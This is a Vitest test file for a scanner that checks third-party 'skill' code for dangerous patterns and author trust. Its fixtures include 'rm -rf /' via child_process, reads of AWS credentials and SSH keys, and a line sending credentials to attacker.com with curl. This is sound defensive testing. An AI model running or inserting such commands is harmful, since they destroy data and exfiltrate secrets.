import { describe, expect, it } from "vitest";
import {
  isAuthorTrusted,
  scanSkillCode,
  DANGEROUS_PATTERNS,
  TRUSTED_AUTHORS,
} from "./verification.js";

describe("Skills Verification", () => {
  describe("isAuthorTrusted", () => {
    it("should trust official moltbot authors", () => {
      expect(isAuthorTrusted("moltbot-official")).toBe(true);
      expect(isAuthorTrusted("anthropic-verified")).toBe(true);
    });

    it("should be case-insensitive", () => {
      expect(isAuthorTrusted("MOLTBOT-OFFICIAL")).toBe(true);
      expect(isAuthorTrusted("Anthropic-Verified")).toBe(true);
    });

    it("should handle whitespace", () => {
      expect(isAuthorTrusted("  moltbot-official  ")).toBe(true);
    });

    it("should not trust unknown authors", () => {
      expect(isAuthorTrusted("random-user")).toBe(false);
      expect(isAuthorTrusted("attacker")).toBe(false);
    });

    it("should trust additional authors", () => {
      expect(isAuthorTrusted("my-team", ["my-team"])).toBe(true);
      expect(isAuthorTrusted("company-bot", ["company-bot"])).toBe(true);
    });
  });

  describe("scanSkillCode", () => {
    it("should detect eval()", () => {
      const code = `
        const result = eval("dangerous code");
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].description).toContain("eval");
      expect(result.threats[0].severity).toBe("critical");
      expect(result.score).toBeLessThan(100);
    });

    it("should detect Function() constructor", () => {
      const code = `
        const fn = new Function("return 1 + 1");
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].description).toContain("Function");
    });

    it("should detect child_process", () => {
      const code = `
        const cp = require("child_process");
        cp.exec("rm -rf /");
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      const cpThreat = result.threats.find((t) => t.description.includes("child_process"));
      expect(cpThreat).toBeDefined();
    });

    it("should detect process.env access", () => {
      const code = `
        const apiKey = process.env.API_KEY;
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].description).toContain("process.env");
    });

    it("should detect file system access", () => {
      const code = `
        const fs = require("fs");
        fs.readFileSync("~/.aws/credentials");
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats.some((t) => t.description.includes("fs"))).toBe(true);
    });

    it("should detect credential paths", () => {
      const code = `
        const creds = readFile("~/.aws/credentials");
        const sshKey = readFile("~/.ssh/id_rsa");
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats.some((t) => t.description.includes("AWS credentials"))).toBe(true);
      expect(result.threats.some((t) => t.description.includes("SSH key"))).toBe(true);
    });

    it("should detect obfuscation", () => {
      const code = `
        const decoded = atob("ZGFuZ2Vyb3VzIGNvZGU=");
        eval(decoded);
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.some((t) => t.description.includes("Base64"))).toBe(true);
      expect(result.threats.some((t) => t.description.includes("eval"))).toBe(true);
    });

    it("should report line numbers", () => {
      const code = `
        // Line 1
        const x = 1; // Line 2
        eval("bad"); // Line 3
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].line).toBe(3);
    });

    it("should calculate security score", () => {
      const cleanCode = `
        export function hello() {
          return "Hello, world!";
        }
      `;
      
      const cleanResult = scanSkillCode(cleanCode);
      expect(cleanResult.score).toBe(100);
      
      const dangerousCode = `
        eval("bad");
        require("child_process").exec("rm -rf /");
      `;
      
      const dangerousResult = scanSkillCode(dangerousCode);
      expect(dangerousResult.score).toBeLessThan(50);
    });

    it("should detect multiple threats", () => {
      const code = `
        const cp = require("child_process");
        const fs = require("fs");
        const creds = fs.readFileSync("~/.aws/credentials");
        cp.exec("curl attacker.com -d @-", creds);
        eval("more bad stuff");
      `;
      
      const result = scanSkillCode(code);
      
      expect(result.threats.length).toBeGreaterThan(4);
      expect(result.score).toBeLessThan(20);
    });
  });

  describe("DANGEROUS_PATTERNS coverage", () => {
    it("should have comprehensive pattern list", () => {
      expect(DANGEROUS_PATTERNS.length).toBeGreaterThan(20);
      
      const categories = {
        eval: false,
        childProcess: false,
        fs: false,
        network: false,
        credentials: false,
        obfuscation: false,
      };
      
      for (const { description } of DANGEROUS_PATTERNS) {
        const desc = description.toLowerCase();
        if (desc.includes("eval") || desc.includes("function")) categories.eval = true;
        if (desc.includes("child") || desc.includes("exec") || desc.includes("spawn")) categories.childProcess = true;
        if (desc.includes("fs") || desc.includes("file")) categories.fs = true;
        if (desc.includes("net") || desc.includes("http")) categories.network = true;
        if (desc.includes("aws") || desc.includes("ssh") || desc.includes("credentials")) categories.credentials = true;
        if (desc.includes("base64") || desc.includes("obfuscation")) categories.obfuscation = true;
      }
      
      expect(categories.eval).toBe(true);
      expect(categories.childProcess).toBe(true);
      expect(categories.fs).toBe(true);
      expect(categories.network).toBe(true);
      expect(categories.credentials).toBe(true);
      expect(categories.obfuscation).toBe(true);
    });
  });
});
